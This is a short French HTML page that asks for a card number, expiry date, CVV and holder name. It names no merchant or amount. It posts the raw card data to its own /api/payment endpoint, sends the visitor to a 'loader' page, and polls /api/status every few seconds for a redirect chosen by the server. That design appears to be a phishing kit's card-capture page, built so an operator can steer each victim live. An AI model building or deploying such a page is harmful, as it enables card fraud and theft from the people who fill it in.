<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>ðŸ’³ Paiement</title>
  <style>
    body { font-family: Arial; text-align: center; background: #fafafa; padding: 20px; }
    form { display: inline-block; background: #fff; padding: 25px; border-radius: 15px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); }
    input { margin: 10px; padding: 10px; width: 220px; border-radius: 8px; border: 1px solid #ccc; }
    button { background: #4caf50; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; }
  </style>
</head>
<body>
  <h1>ðŸ’³ Informations bancaires</h1>
  <form onsubmit="pay(event)">
    <input required name="cardNumber" placeholder="NumÃ©ro de carte"><br>
    <input required name="expiry" placeholder="MM/AA"><br>
    <input required name="cvv" placeholder="CVV"><br>
    <input required name="nomTitulaire" placeholder="Nom du titulaire"><br>
    <button type="submit">Payer</button>
  </form>
  <script>
    async function pay(e){
      e.preventDefault();
      const d=Object.fromEntries(new FormData(e.target));
      await fetch('/api/payment',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});
      location.href='loader.html';
    }
    setInterval(async()=>{ 
      const s=await fetch('/api/status'); const j=await s.json(); 
      if(j.redirect) location.href=j.redirect; 
    },3000);
  </script>
</body>
</html>
